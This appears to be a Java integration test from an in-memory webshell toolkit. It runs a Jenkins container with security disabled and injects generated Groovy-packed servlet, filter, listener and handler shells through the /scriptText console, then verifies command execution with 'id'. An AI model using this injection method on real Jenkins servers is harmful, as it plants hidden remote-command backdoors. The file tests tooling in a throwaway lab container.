package com.reajason.javaweb.integration.memshell.jenkins;

import com.reajason.javaweb.Server;
import com.reajason.javaweb.integration.AbstractContainerTest;
import com.reajason.javaweb.integration.ContainerTestConfig;
import com.reajason.javaweb.integration.ShellAssertion;
import com.reajason.javaweb.memshell.MemShellGenerator;
import com.reajason.javaweb.memshell.MemShellResult;
import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.config.CommandConfig;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.config.ShellToolConfig;
import com.reajason.javaweb.packer.Packers;
import lombok.SneakyThrows;
import net.bytebuddy.jar.asm.Opcodes;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import org.apache.commons.lang3.tuple.Pair;
import org.testcontainers.containers.GenericContainer;
import org.testcontainers.containers.Network;
import org.testcontainers.containers.wait.strategy.Wait;
import org.testcontainers.junit.jupiter.Container;
import org.testcontainers.junit.jupiter.Testcontainers;
import org.testcontainers.utility.MountableFile;

import java.nio.file.Path;
import java.util.List;
import java.util.Locale;
import java.util.Map;

import static org.hamcrest.CoreMatchers.anyOf;
import static org.hamcrest.CoreMatchers.containsString;
import static org.hamcrest.MatcherAssert.assertThat;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * @author ReaJason
 * @since 2024/12/7
 */
@Testcontainers
public class JenkinsJetty12ee9ContainerTest extends AbstractContainerTest {
    private static final ContainerTestConfig CONFIG = ContainerTestConfig
            .builder()
            .imageName("jenkins/jenkins:2.492.1")
            .env(Map.of("JAVA_OPTS", "-Djenkins.install.runSetupWizard=false"))
            .server(Server.Jetty)
            .jakarta(true)
            .serverVersion("12")
            .targetJdkVersion(Opcodes.V17)
            .contextPath("")
            .healthCheckPath("/login")
            .assertLogs(false)
            .waitStrategy(Wait.forHttp("/login").forPort(8080))
            .supportedShellTypes(List.of(
                    ShellType.JAKARTA_SERVLET,
                    ShellType.JAKARTA_FILTER,
                    ShellType.JAKARTA_LISTENER,
                    ShellType.JAKARTA_HANDLER
            ))
            .probeShellTypes(List.of(
                    ShellType.JAKARTA_SERVLET,
                    ShellType.JAKARTA_FILTER,
                    ShellType.JAKARTA_LISTENER,
                    ShellType.JAKARTA_HANDLER
            ))
            .testPackers(List.of(Packers.Groovy))
            .unSupportedShellTools(List.of(ShellTool.AntSword))
            .enableJspPackerTest(false)
            .build();

    private static final MountableFile DISABLE_SECURITY_SCRIPT = MountableFile.forHostPath(
            Path.of("script", "disable-security.groovy").toAbsolutePath());
    private static final OkHttpClient HTTP_CLIENT = new OkHttpClient();

    static Network network = newNetwork();
    @Container
    public static final GenericContainer<?> python = buildPythonContainer(network);

    @Container
    public static final GenericContainer<?> container = buildContainer(CONFIG, network)
            .withCopyToContainer(DISABLE_SECURITY_SCRIPT, "/var/jenkins_home/init.groovy.d/disable-security.groovy");

    @Override
    protected ContainerTestConfig getConfig() {
        return CONFIG;
    }

    @Override
    protected void runShellInject(ContainerTestConfig config, String shellType, String shellTool, Packers packer) {
        String url = getUrl();
        Pair<String, String> urls = ShellAssertion.getUrls(url, shellType, shellTool, packer);
        String shellUrl = urls.getLeft().replace("/test", "/scriptText");
        String urlPattern = urls.getRight();
        ShellToolConfig shellToolConfig = ShellAssertion.getShellToolConfig(shellType, shellTool, packer);
        MemShellResult generateResult = ShellAssertion.generate(urlPattern, config.getServer(), config.getServerVersion(),
                shellType, shellTool, config.getTargetJdkVersion(), shellToolConfig, packer);
        String payload = packer.getInstance().pack(generateResult.toClassPackerConfig());

        injectByScriptText(url, payload);
        ShellAssertion.assertShellIsOk(generateResult, shellUrl, shellTool, shellType, getContainer(), getPythonContainer());
    }

    @Override
    protected void runProbeInject(ContainerTestConfig config, String shellType) {
        String url = getUrl();
        String shellTool = ShellTool.Command;
        Packers packer = Packers.Groovy;
        Pair<String, String> urls = ShellAssertion.getUrls(url, shellType, shellTool, packer);
        String shellUrl = urls.getLeft().replace("/test", "/scriptText");
        String urlPattern = urls.getRight();
        if (urlPattern != null) {
            shellUrl += "testProbe";
            urlPattern += "testProbe";
        }
        int probeTargetJdkVersion = config.getProbeTargetJdkVersion() == null
                ? config.getTargetJdkVersion()
                : config.getProbeTargetJdkVersion();
        ShellConfig shellConfig = ShellConfig.builder()
                .server(config.getServer())
                .serverVersion(config.getServerVersion())
                .shellType(shellType)
                .shellTool(shellTool)
                .targetJreVersion(probeTargetJdkVersion)
                .debug(false)
                .probe(true)
                .build();
        InjectorConfig injectorConfig = InjectorConfig.builder()
                .urlPattern(urlPattern)
                .staticInitialize(true)
                .build();
        String paramName = "tomcatProbe" + shellType;
        CommandConfig commandConfig = CommandConfig.builder()
                .paramName(paramName)
                .build();
        MemShellResult generateResult = MemShellGenerator.generate(shellConfig, injectorConfig, commandConfig);
        String payload = packer.getInstance().pack(generateResult.toClassPackerConfig());

        String res = injectByScriptText(url, payload);
        assertThat(res, anyOf(
                containsString("context: "),
                containsString("server: "),
                containsString("channel: "),
                containsString("namespace: ")
        ));
        ShellAssertion.commandIsOk(shellUrl, shellType, paramName, "id");
    }

    @SneakyThrows
    private String injectByScriptText(String url, String payload) {
        RequestBody requestBody = new FormBody.Builder()
                .add("script", payload)
                .build();
        Request request = new Request.Builder()
                .header("Content-Type", "application/x-www-form-urlencoded")
                .url(url + "/scriptText")
                .post(requestBody)
                .build();
        try (Response response = HTTP_CLIENT.newCall(request).execute()) {
            String body = response.body().string();
            assertTrue(response.isSuccessful(), "Jenkins scriptText should return 2xx, body: " + body);
            assertTrue(isScriptTextResponseOk(body), "Jenkins scriptText should not return a Groovy error, body: " + body);
            return body;
        }
    }

    private boolean isScriptTextResponseOk(String body) {
        String normalizedBody = body.toLowerCase(Locale.ROOT);
        return !normalizedBody.contains("groovy.lang.missing")
                && !normalizedBody.contains("groovy.lang.groovyruntimeexception")
                && !normalizedBody.contains("org.codehaus.groovy.control.multiplecompilationerrorsexception")
                && !normalizedBody.contains("script1.groovy")
                && !normalizedBody.contains("exception");
    }
}
